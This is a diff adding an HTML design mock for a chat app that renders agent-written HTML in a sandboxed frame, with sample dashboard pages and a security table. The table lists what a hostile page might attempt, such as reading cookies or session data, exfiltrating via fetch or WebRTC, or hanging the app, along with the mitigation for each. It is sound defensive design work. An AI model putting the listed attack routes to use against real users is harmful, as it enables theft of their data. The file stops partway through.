@@ -1,0 +1,1006 @@
+<!doctype html>
+<html lang="es" data-theme="dark">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HTML en el chat — mock</title>
+<style>
+/* Tokens: verbatim from desktop/renderer2/src/styles/tokens.css (AA-raised 2026-10-11). */
+:root {
+  color-scheme: dark;
+  --bg: #0f0e0d; --side: #151413; --panel: #1d1c1a; --card: #1a1918; --field: #252320;
+  --ink: #f2efe9; --ink2: #cfcbc4; --muted: #9c978f; --faint: #908b82;
+  --line: rgba(255, 255, 255, .075); --line2: rgba(255, 255, 255, .14);
+  --acc: #4fa583; --link: #8fb0ea; --amber: #d8a05a; --add: #4cae7f; --del: #d96b5f;
+  --shell: #0b0a09;
+  --read: 1040px;
+  --mono: ui-monospace, "SF Mono", Menlo, monospace;
+}
+:root[data-theme="light"] {
+  color-scheme: light;
+  --bg: #f2f0ed; --side: #faf9f7; --panel: #ffffff; --card: #ffffff; --field: #f1efeb;
+  --ink: #23211e; --ink2: #47443e; --muted: #5f5b55; --faint: #6d685f;
+  --line: rgba(0, 0, 0, .08); --line2: rgba(0, 0, 0, .15);
+  --acc: #177353; --link: #3861b0; --amber: #8b5f1a; --add: #177347; --del: #b64134;
+  --shell: #eceae6;
+}
+* { box-sizing: border-box; }
+html, body { margin: 0; }
+body { background: var(--shell); color: var(--ink); font: 13.5px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; -webkit-font-smoothing: antialiased; }
+svg { display: block; }
+.ic { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 1.4; stroke-linecap: round; stroke-linejoin: round; flex: none; }
+button { font: inherit; }
+
+/* ── mock chrome (outside the app window; not product UI) ───────────────── */
+.mk { margin: 0 auto; padding: 22px 24px 44px; }
+.mk-head { display: flex; align-items: flex-start; gap: 20px; margin: 0 0 14px; }
+.mk-title { margin: 0; font-size: 16px; font-weight: 600; }
+.mk-sub { margin: 3px 0 0; max-width: 860px; color: var(--muted); font-size: 12.5px; line-height: 1.5; }
+.mk-head .sp { flex: 1; }
+.mk-ctl { display: flex; flex: none; flex-wrap: wrap; justify-content: flex-end; align-items: center; gap: 8px; }
+.mk-seg { display: inline-flex; gap: 2px; padding: 2px; border: 1px solid var(--line2); border-radius: 9px; background: var(--side); }
+.mk-seg button { display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; border: 0; border-radius: 7px; background: transparent; color: var(--muted); font-size: 12px; white-space: nowrap; cursor: pointer; }
+.mk-seg button:hover { color: var(--ink); }
+.mk-seg button[aria-selected="true"] { background: var(--field); color: var(--ink); box-shadow: inset 0 0 0 1px var(--line2); }
+.mk-btn { display: inline-flex; align-items: center; gap: 6px; padding: 5px 11px; border: 1px solid var(--line2); border-radius: 9px; background: var(--side); color: var(--ink2); font-size: 12px; cursor: pointer; }
+.mk-btn:hover { color: var(--ink); background: var(--field); }
+.mk-tabs { display: flex; flex-wrap: wrap; gap: 10px 18px; margin: 0 0 12px; }
+.mk-group { display: grid; gap: 5px; align-content: start; }
+.mk-glabel { color: var(--faint); font: 600 10.5px/1 var(--mono); letter-spacing: .06em; text-transform: uppercase; }
+.rec { width: 6px; height: 6px; border-radius: 50%; background: var(--acc); flex: none; }
+.mk-notes { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px 18px; margin: 0 0 16px; padding: 12px 14px; border: 1px solid var(--line); border-radius: 10px; background: var(--side); }
+.mk-note b { display: block; color: var(--ink); font-size: 12px; font-weight: 600; }
+.mk-note p { margin: 2px 0 0; color: var(--muted); font-size: 12px; line-height: 1.5; }
+.mk-note .ref { display: block; margin-top: 3px; color: var(--faint); font: 10.5px/1.4 var(--mono); }
+.mk-sec { margin: 22px 0 0; padding: 16px 18px; border: 1px solid var(--line); border-radius: 12px; background: var(--side); }
+.mk-sec h2 { margin: 0 0 4px; font-size: 14px; font-weight: 600; }
+.mk-sec > p { margin: 0 0 12px; max-width: 980px; color: var(--muted); font-size: 12.5px; line-height: 1.5; }
+.mk-table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+.mk-table th, .mk-table td { padding: 7px 10px; border-bottom: 1px solid var(--line); text-align: left; vertical-align: top; }
+.mk-table th { color: var(--muted); font-weight: 500; font-size: 11.5px; }
+.mk-table td:first-child { color: var(--ink); }
+.mk-table td { color: var(--ink2); }
+.mk-table code { padding: .5px 5px; border: 1px solid var(--line); border-radius: 5px; background: var(--field); color: var(--ink2); font: 11.5px var(--mono); }
+.mk-where { color: var(--faint); font: 11px var(--mono); white-space: nowrap; }
+
+/* ── the app window ─────────────────────────────────────────────────────── */
+.app { display: grid; grid-template-columns: 288px minmax(0, 1fr); overflow: hidden; border: 1px solid var(--line2); border-radius: 12px; background: var(--bg); box-shadow: 0 24px 60px rgba(0, 0, 0, .22); }
+.side { padding: 40px 10px 14px; border-right: 1px solid var(--line); background: var(--side); }
+.side .proj { display: flex; align-items: center; gap: 8px; margin: 0 0 6px; padding: 4px 9px; color: var(--muted); font-size: 12px; font-weight: 600; }
+.side .row { overflow: hidden; padding: 5.5px 9px; border-radius: 8px; color: var(--ink2); font-size: 13.5px; white-space: nowrap; text-overflow: ellipsis; }
+.side .row.on { background: var(--field); color: var(--ink); }
+.main { display: flex; min-width: 0; flex-direction: column; }
+.tbar { display: flex; height: 44px; align-items: center; gap: 10px; padding: 0 18px; color: var(--ink); font-size: 13px; font-weight: 600; }
+.doc { width: 100%; max-width: var(--read); margin: 0 auto; padding: 14px 36px 4px; }
+.userpill { display: flex; flex-direction: column; align-items: flex-end; margin: 12px 0 20px; }
+.userpill-text { max-width: 78%; padding: 7px 13px; border: 1px solid var(--line); border-radius: 14px; background: var(--field); font-size: 13px; white-space: pre-wrap; word-break: break-word; }
+.amsg { margin: 0 0 6px; }
+.p { margin: 0 0 14px; max-width: var(--read); overflow-wrap: anywhere; }
+.p code { padding: .5px 5px; border: 1px solid var(--line); border-radius: 5px; background: var(--field); color: var(--ink2); font: 11.5px var(--mono); }
+.working { display: flex; height: 32px; align-items: center; gap: 9px; margin: 4px 0 0; color: var(--ink2); font-size: 13.5px; }
+.working .meta { color: var(--faint); font-size: 12.5px; }
+.orbit { position: relative; width: 13px; height: 13px; flex: none; }
+.orbit::before { content: ""; position: absolute; inset: 0; border: 1.5px solid color-mix(in srgb, var(--acc) 30%, transparent); border-radius: 50%; }
+.orbit::after { content: ""; position: absolute; top: -1px; left: 4.5px; width: 4px; height: 4px; border-radius: 50%; background: var(--acc); transform-origin: 2px 7.5px; animation: orb 1s linear infinite; }
+.orbit.sm { width: 11px; height: 11px; }
+.orbit.sm::after { left: 3.5px; transform-origin: 2px 6.5px; }
+@keyframes orb { to { transform: rotate(360deg); } }
+.composer { width: calc(100% - 48px); max-width: calc(var(--read) - 48px); min-height: 74px; margin: 10px auto 16px; padding: 12px 14px; border: 1px solid var(--line2); border-radius: 14px; background: var(--field); color: var(--faint); font-size: 13.5px; }
+
+/* Existing code block — verbatim from app.css (.codebox …). */
+.codebox { max-width: var(--read); margin: 0 0 14px; overflow: hidden; border: 1px solid var(--line); border-radius: 10px; background: var(--field); color: var(--ink2); }
+.code-head { display: flex; min-height: 33px; align-items: center; gap: 9px; padding: 5px 8px 5px 12px; border-bottom: 1px solid var(--line); background: color-mix(in srgb, var(--panel) 48%, var(--field)); }
+.code-lang { flex: 1; min-width: 0; overflow: hidden; color: var(--muted); font: 600 10.5px/1.2 var(--mono); letter-spacing: .025em; white-space: nowrap; text-overflow: ellipsis; }
+.code-copy { display: inline-flex; flex: none; min-height: 23px; align-items: center; gap: 5px; padding: 2px 7px; border: 1px solid transparent; border-radius: 6px; background: transparent; color: var(--muted); font: 500 10.5px/1 var(--mono); cursor: pointer; transition: color .12s ease, border-color .12s ease, background .12s ease; }
+.code-copy:hover { border-color: var(--line2); background: color-mix(in srgb, var(--ink) 4%, transparent); color: var(--ink); }
+.code-copy:focus-visible { outline: 2px solid color-mix(in srgb, var(--link) 65%, transparent); outline-offset: 1px; }
+.code-copy[data-state="copied"] { color: var(--acc); }
+.code-copy .ic { width: 12px; height: 12px; }
+.code-body { margin: 0; padding: 12px 14px; overflow-x: auto; color: var(--ink2); font: 12px/1.65 var(--mono); white-space: pre; tab-size: 2; }
+.code-body code { color: inherit; font: inherit; }
+.codebox .tk-cm { color: var(--faint); font-style: italic; }
+.codebox .tk-kw { color: var(--link); font-weight: 600; }
+.codebox .tk-str { color: var(--acc); }
+.codebox .tk-attr { color: color-mix(in srgb, var(--amber) 82%, var(--ink2)); }
+.codebox .tk-op { color: var(--muted); }
+
+/* ── NEW: the rendered HTML block (.hb) ─────────────────────────────────── */
+.hb { max-width: var(--read); margin: 2px 0 16px; }
+.hb-frame { display: block; width: 100%; height: 24px; border: 0; background: transparent; opacity: 0; transition: opacity .18s ease; }
+.hb-frame.sized { opacity: 1; }
+.hb-clip { position: relative; }
+.hb.capped:not(.open) .hb-clip { max-height: 640px; overflow: hidden; }
+.hb-fade { display: none; position: absolute; right: 0; bottom: 0; left: 0; height: 56px; background: linear-gradient(to bottom, color-mix(in srgb, var(--bg) 0%, transparent), var(--bg)); pointer-events: none; }
+.hb.capped.overflow:not(.open) .hb-fade { display: block; }
+.hb-more { display: none; align-items: center; gap: 6px; margin: 6px 0 0; padding: 3px 0; border: 0; background: transparent; color: var(--muted); font-size: 12.5px; cursor: pointer; }
+.hb-more:hover { color: var(--ink); }
+.hb.capped.overflow .hb-more { display: inline-flex; }
+.hb.open .hb-more .ic { transform: rotate(180deg); }
+.hb-code .code-body { max-height: 420px; overflow: auto; }
+.hbtn { display: grid; width: 26px; height: 26px; flex: none; place-items: center; border: 0; border-radius: 6px; background: transparent; color: var(--muted); cursor: pointer; }
+.hbtn:hover { background: color-mix(in srgb, var(--ink) 7%, transparent); color: var(--ink); }
+.hbtn:focus-visible { outline: 2px solid color-mix(in srgb, var(--link) 65%, transparent); outline-offset: 1px; }
+.hbtn[data-state="copied"] { color: var(--acc); }
+/* A · borderless, hover-only glass controls (t3code HtmlRenderFrame). */
+.hb-a .hb-pill { position: absolute; top: 8px; right: 8px; z-index: 2; display: flex; gap: 2px; padding: 3px; border: 1px solid var(--line2); border-radius: 9px; background: color-mix(in srgb, var(--panel) 86%, transparent); box-shadow: 0 6px 18px rgba(0, 0, 0, .18); opacity: 0; transition: opacity .15s ease; backdrop-filter: blur(8px); }
+.hb-a:hover .hb-pill, .hb-a:focus-within .hb-pill, .hb-a.demo-hover .hb-pill { opacity: 1; }
+/* B · borderless, a slim always-visible icon row (t3code Mermaid diagram mode). */
+.hb-b .hb-row { display: flex; height: 28px; align-items: center; justify-content: flex-end; gap: 2px; margin: 0 -5px 2px 0; }
+.hb-b .hbtn { width: 24px; height: 24px; }
+/* C · inside the existing code block. */
+.hb-c .hb-body { padding: 14px 16px; background: var(--bg); }
+.hb-c.capped .hb-more { margin: 0; padding: 8px 16px 9px; width: 100%; border-top: 1px solid var(--line); background: var(--bg); }
+.hb-seg { display: inline-flex; flex: none; gap: 2px; padding: 2px; border: 1px solid var(--line); border-radius: 7px; }
+.hb-seg button { min-height: 19px; padding: 1px 8px; border: 0; border-radius: 5px; background: transparent; color: var(--muted); font: 500 10.5px/1 var(--mono); cursor: pointer; }
+.hb-seg button:hover { color: var(--ink); }
+.hb-seg button[aria-pressed="true"] { background: color-mix(in srgb, var(--ink) 9%, transparent); color: var(--ink); }
+.code-head .hbtn { width: 23px; height: 23px; }
+/* Streaming placeholders. */
+.hb-line { display: flex; min-height: 36px; align-items: center; gap: 9px; max-width: var(--read); margin: 2px 0 16px; padding: 0 6px 0 12px; border: 1px solid var(--line); border-radius: 10px; }
+.hb-line .t { color: var(--ink2); font-size: 13px; }
+.hb-line .m { color: var(--faint); font: 11.5px var(--mono); }
+.hb-line .sp { flex: 1; }
+.hb-line .code-copy { font-size: 10.5px; }
+.hb-line-peek { margin: -10px 0 16px; }
+.hb-live-tag { display: inline-flex; align-items: center; gap: 7px; color: var(--muted); font: 500 10.5px/1 var(--mono); }
+.hb-b .hb-live-tag { padding-right: 6px; }
+.hb-a .hb-live-tag { position: absolute; top: 8px; right: 10px; z-index: 2; padding: 5px 8px; border: 1px solid var(--line2); border-radius: 8px; background: color-mix(in srgb, var(--panel) 86%, transparent); }
+.caret { display: inline-block; width: 7px; height: 13px; margin-left: 1px; vertical-align: -2px; background: var(--muted); opacity: .6; }
+
+/* Expand: t3code dialog (HtmlRenderDialog) and a full-window variant. */
+.ovl { position: fixed; inset: 0; z-index: 60; display: flex; align-items: center; justify-content: center; background: rgba(0, 0, 0, .78); animation: fadein .14s ease; }
+@keyframes fadein { from { opacity: 0; } }
+.ovl-close { position: fixed; top: 16px; right: 18px; display: grid; width: 34px; height: 34px; place-items: center; border: 1px solid rgba(255, 255, 255, .16); border-radius: 9px; background: rgba(29, 28, 26, .72); color: #e9e5de; cursor: pointer; }
+.ovl-close:hover { background: rgba(29, 28, 26, .95); color: #fff; }
+.dlg { display: flex; width: 92vw; flex-direction: column; align-items: stretch; }
+.dlg-panel { height: min(86vh, calc(100vh - 160px)); overflow: auto; overscroll-behavior: contain; padding: 16px; border-radius: 12px; background: var(--bg); box-shadow: 0 24px 70px rgba(0, 0, 0, .5), 0 0 0 1px var(--line2); container-type: size; }
+.dlg-zoom { width: 100cqw; height: 100cqh; }
+.dlg-zoom .hb-frame { height: 100%; opacity: 1; }
+.dlg-foot { display: flex; min-width: 0; align-items: center; justify-content: center; gap: 12px; margin-top: 10px; color: rgba(255, 255, 255, .82); font-size: 12.5px; }
+.dlg-title { overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+.dlg-zoomctl { display: flex; flex: none; align-items: center; gap: 2px; }
+.dlg-zoomctl button { display: grid; min-width: 28px; height: 28px; place-items: center; padding: 0 6px; border: 0; border-radius: 7px; background: rgba(255, 255, 255, .08); color: rgba(255, 255, 255, .86); font: 500 11.5px var(--mono); cursor: pointer; }
+.dlg-zoomctl button:hover { background: rgba(255, 255, 255, .16); color: #fff; }
+.dlg-zoomctl button:disabled { opacity: .4; cursor: default; }
+.fsw { position: fixed; inset: 0; z-index: 60; display: flex; flex-direction: column; background: var(--bg); animation: fadein .14s ease; }
+.fsw-bar { display: flex; height: 40px; flex: none; align-items: center; gap: 4px; padding: 0 8px 0 16px; border-bottom: 1px solid var(--line); }
+.fsw-title { overflow: hidden; color: var(--ink2); font-size: 13px; font-weight: 600; white-space: nowrap; text-overflow: ellipsis; }
+.fsw-bar .sp { flex: 1; }
+.fsw-body { position: relative; flex: 1; min-height: 0; overflow: auto; padding: 18px 24px; }
+.fsw-body .hb-frame { height: 100%; opacity: 1; }
+.fsw-body .codebox { margin: 0; }
+.fsw-body .code-body { max-height: none; }
+
+/* Link confirmation (a click on a link inside a page). */
+.linkask { position: fixed; bottom: 22px; left: 50%; z-index: 70; display: flex; max-width: min(640px, calc(100vw - 40px)); align-items: center; gap: 12px; padding: 10px 10px 10px 14px; border: 1px solid var(--line2); border-radius: 12px; background: var(--panel); box-shadow: 0 16px 40px rgba(0, 0, 0, .3); transform: translateX(-50%); animation: fadein .14s ease; }
+.linkask .t { min-width: 0; color: var(--ink2); font-size: 12.5px; }
+.linkask .u { display: block; overflow: hidden; color: var(--ink); font: 12px var(--mono); white-space: nowrap; text-overflow: ellipsis; }
+.linkask button { flex: none; padding: 5px 11px; border: 1px solid var(--line2); border-radius: 8px; background: transparent; color: var(--ink2); font-size: 12.5px; cursor: pointer; }
+.linkask button.go { border-color: var(--ink); background: var(--ink); color: var(--bg); font-weight: 600; }
+</style>
+</head>
+<body>
+<svg width="0" height="0" style="position:absolute" aria-hidden="true"><defs>
+  <!-- Each mark depicts its action (no wildcard glyphs). -->
+  <symbol id="i-code" viewBox="0 0 16 16"><path d="M5.2 4.8L2.4 8l2.8 3.2M10.8 4.8L13.6 8l-2.8 3.2M9.1 3.3L6.9 12.7"/></symbol>
+  <symbol id="i-page" viewBox="0 0 16 16"><rect x="2" y="2.8" width="12" height="10.4" rx="2"/><path d="M2 5.9h12M4.7 8.6h4.4M4.7 10.7h6.6"/></symbol>
+  <symbol id="i-copy" viewBox="0 0 16 16"><rect x="5" y="5" width="8" height="8" rx="1.5"/><path d="M3 11V4a1 1 0 011-1h7"/></symbol>
+  <symbol id="i-check" viewBox="0 0 16 16"><path d="M3.5 8.5l3 3 6-7"/></symbol>
+  <symbol id="i-expand" viewBox="0 0 16 16"><path d="M9.5 2.5h4v4M6.5 13.5h-4v-4M13.5 2.5L9 7M2.5 13.5L7 9"/></symbol>
+  <symbol id="i-contract" viewBox="0 0 16 16"><path d="M13.5 2.5L9.5 6.5M9.5 3.2v3.3h3.3M2.5 13.5l4-4M6.5 12.8V9.5H3.2"/></symbol>
+  <symbol id="i-close" viewBox="0 0 16 16"><path d="M4 4l8 8M12 4l-8 8"/></symbol>
+  <symbol id="i-minus" viewBox="0 0 16 16"><path d="M3.5 8h9"/></symbol>
+  <symbol id="i-plus" viewBox="0 0 16 16"><path d="M8 3.5v9M3.5 8h9"/></symbol>
+  <symbol id="i-down" viewBox="0 0 16 16"><path d="M4.5 6.5L8 10l3.5-3.5"/></symbol>
+  <symbol id="i-play" viewBox="0 0 16 16"><path d="M5 3.5l7 4.5-7 4.5z"/></symbol>
+</defs></svg>
+
+<div class="mk">
+  <div class="mk-head">
+    <div>
+      <h1 class="mk-title">HTML en el chat — mock</h1>
+      <p class="mk-sub">An <code>```html</code> block from the agent, rendered in place the way t3code renders pages: a sandboxed frame that fits its page, follows the theme live, and has no network. Pick one tab per group; the green dot marks the recommendation. Nothing here is implemented. Try it: hover the pages, toggle code, drag the simulator, switch the theme (the pages follow it), and replay the last block being written.</p>
+    </div>
+    <span class="sp"></span>
+    <div class="mk-ctl">
+      <span class="mk-seg" role="tablist" aria-label="Tema" id="themeSeg">
+        <button type="button" role="tab" data-theme-set="dark">Oscuro</button>
+        <button type="button" role="tab" data-theme-set="light">Claro</button>
+      </span>
+      <button type="button" class="mk-btn" id="replay"><svg class="ic"><use href="#i-play"/></svg>Reproducir escritura</button>
+      <button type="button" class="mk-btn" id="recommended"><span class="rec"></span>Recomendado</button>
+    </div>
+  </div>
+  <nav class="mk-tabs" id="tabs" aria-label="Variantes"></nav>
+  <div class="mk-notes" id="notes"></div>
+
+  <div class="app" id="app">
+    <aside class="side" aria-hidden="true">
+      <div class="proj">workass</div>
+      <div class="row on">Latencia y cobertura del daemon</div>
+      <div class="row">Revisar etiquetas silver</div>
+      <div class="row">Migración a SQLite</div>
+      <div class="row">Carga de chats más rápida</div>
+      <div class="row">Steer en Claude</div>
+      <div class="row">Ícono de la app</div>
+    </aside>
+    <section class="main">
+      <div class="tbar">Latencia y cobertura del daemon</div>
+      <div class="doc" id="doc"></div>
+      <div class="composer">Contale a tu agente qué sigue…</div>
+    </section>
+  </div>
+
+  <section class="mk-sec" id="security">
+    <h2>Seguridad: qué frena a la página</h2>
+    <p>The "Me llegó este HTML" reply runs a hostile page for real inside this mock: every row of its log is the browser's actual answer to the sandbox and CSP below. The last three rows of this table belong to the Electron shell and cannot be shown in a plain browser.</p>
+    <table class="mk-table">
+      <thead><tr><th>La página intenta</th><th>Qué la frena</th><th>Dónde</th></tr></thead>
+      <tbody>
+        <tr><td>Leer cookies, localStorage o la sesión de Workass</td><td>Opaque origin: the frame never gets <code>allow-same-origin</code>, so storage and cookies throw</td><td class="mk-where">iframe sandbox</td></tr>
+        <tr><td>Tocar la ventana de Workass (<code>parent.document</code>)</td><td>Opaque origin is cross-origin to the app; only <code>postMessage</code> crosses, and the host accepts three message types (size, link, Esc)</td><td class="mk-where">iframe sandbox</td></tr>
+        <tr><td>Mandar datos afuera o al daemon local (fetch, WebSocket, beacon)</td><td><code>connect-src 'none'</code></td><td class="mk-where">CSP meta, first in head</td></tr>
+        <tr><td>Cargar algo remoto (píxel, CDN, fuente, iframe)</td><td><code>default-src 'none'</code>; only <code>data:</code>/<code>blob:</code> images, fonts and media</td><td class="mk-where">CSP meta</td></tr>
+        <tr><td>Abrir ventanas, alert(), enviar formularios afuera</td><td>No <code>allow-popups</code> / <code>allow-modals</code>; <code>form-action 'none'</code></td><td class="mk-where">sandbox + CSP</td></tr>
+        <tr><td>Llevar Workass a otra página</td><td>No <code>allow-top-navigation</code></td><td class="mk-where">iframe sandbox</td></tr>
+        <tr><td>Abrir un enlace</td><td>The bootstrap stops the click and asks the host; the host shows the full URL and opens it only if you confirm (click the "Usar otra cuenta" link)</td><td class="mk-where">bootstrap + host</td></tr>
+        <tr><td>Navegar su propio frame (<code>location=</code>, meta refresh)</td><td><code>will-frame-navigate</code> cancels every navigation of a render frame</td><td class="mk-where">Electron shell</td></tr>
+        <tr><td>Salir por WebRTC (STUN)</td><td>Bootstrap deletes <code>RTCPeerConnection</code>; <code>setWebRTCIPHandlingPolicy('disable_non_proxied_udp')</code> is the backstop</td><td class="mk-where">bootstrap + shell</td></tr>
+        <tr><td>Colgar la app con un bucle infinito</td><td>Sandboxed frames run in their own renderer process (<code>IsolateSandboxedIframes</code>), so only the frame freezes; gate G3 verifies it</td><td class="mk-where">Electron/Chromium</td></tr>
+      </tbody>
+    </table>
+  </section>
+</div>
+
+<script>
+'use strict';
+
+/* ───────────────────────── agent-written pages ───────────────────────── */
+const PAGE_DASH = `<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>Latencia del daemon · 24 h</title>
+<style>
+  .wrap { display: grid; gap: 16px; }
+  header h1 { margin: 0; font-size: 16px; font-weight: 600; }
+  header p { margin: 2px 0 0; color: var(--muted-foreground); font-size: 12.5px; }
+  .kpis { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; }
+  .kpi { padding: 12px 14px; border: 1px solid var(--border); border-radius: var(--radius); background: var(--card); }
+  .kpi span { display: block; color: var(--muted-foreground); font-size: 11.5px; }
+  .kpi b { display: block; margin-top: 2px; font-size: 21px; font-weight: 600; font-variant-numeric: tabular-nums; }
+  .kpi small { color: var(--muted-foreground); font-size: 11.5px; }
+  .panel { padding: 14px 16px; border: 1px solid var(--border); border-radius: var(--radius); background: var(--card); }
+  .panel h2 { margin: 0 0 10px; font-size: 12.5px; font-weight: 600; }
+  .legend { display: flex; gap: 14px; margin: -4px 0 12px; color: var(--muted-foreground); font-size: 11.5px; }
+  .legend i { display: inline-block; width: 12px; height: 2px; margin-right: 6px; vertical-align: middle; border-radius: 1px; }
+  .plot { display: grid; grid-template-columns: 30px 1fr; gap: 10px; }
+  .yaxis { display: flex; height: 180px; flex-direction: column; justify-content: space-between; margin-top: -7px; color: var(--muted-foreground); font: 10.5px/14px var(--font-mono); text-align: right; }
+  .area { position: relative; height: 180px; }
+  .area svg { position: absolute; inset: 0; width: 100%; height: 100%; overflow: visible; }
+  .area line { stroke: var(--border); }
+  .dot { position: absolute; left: 60.87%; top: 5%; width: 8px; height: 8px; border: 2px solid var(--card); border-radius: 50%; background: var(--chart-2); transform: translate(-50%, -50%); }
+  .note { position: absolute; left: calc(60.87% + 10px); top: 0; color: var(--muted-foreground); font-size: 11.5px; white-space: nowrap; transform: translateY(-50%); }
+  .xaxis { display: flex; justify-content: space-between; margin: 8px 0 0 40px; color: var(--muted-foreground); font: 10.5px var(--font-mono); }
+  table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+  th, td { padding: 7px 8px; border-bottom: 1px solid var(--border); text-align: left; }
+  th { color: var(--muted-foreground); font-size: 11.5px; font-weight: 500; }
+  tr:last-child td { border-bottom: 0; }
+  .n { text-align: right; font-variant-numeric: tabular-nums; }
+  td.n { font: 12px var(--font-mono); }
+  .meter { width: 120px; height: 6px; overflow: hidden; border-radius: 3px; background: var(--muted); }
+  .meter i { display: block; height: 100%; border-radius: 3px; background: var(--chart-2); }
+  code { font-size: 11.5px; }
+  ul { margin: 0; padding-left: 18px; } li { margin: 3px 0; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <h1>Latencia del daemon · últimas 24 h</h1>
+    <p>workass 0.1.223 · Mac de desarrollo · 1.284 turnos</p>
+  </header>
+  <section class="kpis">
+    <div class="kpi"><span>p50</span><b>42 ms</b><small>igual que ayer</small></div>
+    <div class="kpi"><span>p95</span><b>178 ms</b><small>+12 ms contra ayer</small></div>
+    <div class="kpi"><span>Errores</span><b>0,3 %</b><small>4 de 1.284</small></div>
+    <div class="kpi"><span>Reconexiones</span><b>3</b><small>todas a las 14 h</small></div>
+  </section>
+  <section class="panel">
+    <h2>Latencia por hora</h2>
+    <div class="legend"><span><i style="background:var(--chart-1)"></i>p50</span><span><i style="background:var(--chart-2)"></i>p95</span></div>
+    <div class="plot">
+      <div class="yaxis"><span>400</span><span>300</span><span>200</span><span>100</span><span>0</span></div>
+      <div class="area">
+        <svg viewBox="0 0 230 100" preserveAspectRatio="none" aria-hidden="true">
+          <line x1="0" x2="230" y1="0" y2="0" vector-effect="non-scaling-stroke"/>
+          <line x1="0" x2="230" y1="25" y2="25" vector-effect="non-scaling-stroke"/>
+          <line x1="0" x2="230" y1="50" y2="50" vector-effect="non-scaling-stroke"/>
+          <line x1="0" x2="230" y1="75" y2="75" vector-effect="non-scaling-stroke"/>
+          <line x1="0" x2="230" y1="100" y2="100" vector-effect="non-scaling-stroke"/>
+          <polyline fill="none" stroke="var(--chart-2)" stroke-width="1.8" stroke-linejoin="round" vector-effect="non-scaling-stroke"
+            points="0,62.5 10,64.5 20,65.5 30,66.25 40,65 50,63 60,60 70,57 80,55 90,56 100,57.5 110,58 120,56.25 130,54.5 140,5 150,40 160,52.5 170,55.5 180,57 190,58 200,58.75 210,60 220,60.5 230,61.25"/>
+          <polyline fill="none" stroke="var(--chart-1)" stroke-width="1.8" stroke-linejoin="round" vector-effect="non-scaling-stroke"
+            points="0,90 10,90.5 20,90.75 30,91 40,90.5 50,90 60,89.5 70,88.75 80,88.25 90,88.5 100,89 110,89.25 120,89 130,88.5 140,76 150,85 160,88 170,88.75 180,89.25 190,89.5 200,89.75 210,90 220,90 230,90.25"/>
+        </svg>
+        <span class="dot"></span><span class="note">14:00 · 380 ms · reconexión de bridges</span>
+      </div>
+    </div>
+    <div class="xaxis"><span>00 h</span><span>06 h</span><span>12 h</span><span>18 h</span><span>23 h</span></div>
+  </section>
+  <section class="panel">
+    <h2>Canales más lentos (p95)</h2>
+    <table>
+      <thead><tr><th>Canal</th><th class="n">Llamadas</th><th class="n">p95</th><th></th></tr></thead>
+      <tbody>
+        <tr><td><code>session/prompt</code></td><td class="n">1.284</td><td class="n">312 ms</td><td><div class="meter"><i style="width:78%"></i></div></td></tr>
+        <tr><td><code>chat:archive-load</code></td><td class="n">412</td><td class="n">188 ms</td><td><div class="meter"><i style="width:47%"></i></div></td></tr>
+        <tr><td><code>visualize:host</code></td><td class="n">9</td><td class="n">141 ms</td><td><div class="meter"><i style="width:35%"></i></div></td></tr>
+        <tr><td><code>settings:get</code></td><td class="n">2.930</td><td class="n">38 ms</td><td><div class="meter"><i style="width:10%"></i></div></td></tr>
+        <tr><td><code>spawned-work:list</code></td><td class="n">1.102</td><td class="n">31 ms</td><td><div class="meter"><i style="width:8%"></i></div></td></tr>
+        <tr><td><code>session-state</code></td><td class="n">1.284</td><td class="n">27 ms</td><td><div class="meter"><i style="width:7%"></i></div></td></tr>
+      </tbody>
+    </table>
+  </section>
+  <section class="panel">
+    <h2>Qué mirar</h2>
+    <ul>
+      <li>El pico de las 14 h coincide con las tres reconexiones; fuera de esa hora el p95 no pasó de 190 ms.</li>
+      <li><code>chat:archive-load</code> es la única lectura por encima de 150 ms: es la que ataca el cambio a SQLite.</li>
+    </ul>
+  </section>
+</div>
+</body>
+</html>`;
+
+const PAGE_CHIPS = `<style>
+  .row { display: flex; flex-wrap: wrap; gap: 8px; }
+  .chip { display: inline-flex; align-items: center; gap: 7px; height: 26px; padding: 0 11px; border: 1px solid var(--border); border-radius: 999px; background: var(--card); font-size: 12.5px; }
+  .chip i { width: 7px; height: 7px; border-radius: 50%; }
+</style>
+<div class="row">
+  <span class="chip"><i style="background:var(--accent)"></i>En curso</span>
+  <span class="chip"><i style="background:var(--muted-foreground)"></i>En cola</span>
+  <span class="chip"><i style="background:var(--warning)"></i>Esperando permiso</span>
+  <span class="chip"><i style="background:var(--destructive)"></i>Falló</span>
+</div>`;
+
+const PAGE_SIM = `<!doctype html>
+<html lang="es">
+<head>
+<title>Simulador de reintentos</title>
+<style>
+  .sim { display: grid; gap: 16px; }
+  .controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); gap: 12px 22px; }
+  label { display: grid; gap: 6px; color: var(--muted-foreground); font-size: 12.5px; }
+  .lab { display: flex; justify-content: space-between; }
+  label b, .sum b { color: var(--foreground); font-weight: 600; font-variant-numeric: tabular-nums; }
+  input[type=range] { width: 100%; margin: 0; accent-color: var(--accent); }
+  .seg { display: inline-flex; width: max-content; gap: 2px; padding: 2px; border: 1px solid var(--border); border-radius: 8px; }
+  .seg button { padding: 3px 11px; border: 0; border-radius: 6px; background: transparent; color: var(--muted-foreground); font: inherit; font-size: 12px; cursor: pointer; }
+  .seg button[aria-pressed=true] { background: var(--muted); color: var(--foreground); }
+  .bars { display: flex; height: 150px; align-items: flex-end; gap: 8px; padding: 20px 2px 0; border-bottom: 1px solid var(--border); }
+  .bars div { position: relative; flex: 1; min-width: 12px; border-radius: 4px 4px 0 0; background: var(--chart-2); }
+  .bars span { position: absolute; top: -18px; left: 50%; color: var(--muted-foreground); font: 10.5px var(--font-mono); white-space: nowrap; transform: translateX(-50%); }
+  .sum { display: flex; flex-wrap: wrap; gap: 6px 24px; color: var(--muted-foreground); font-size: 12.5px; }
+</style>
+</head>
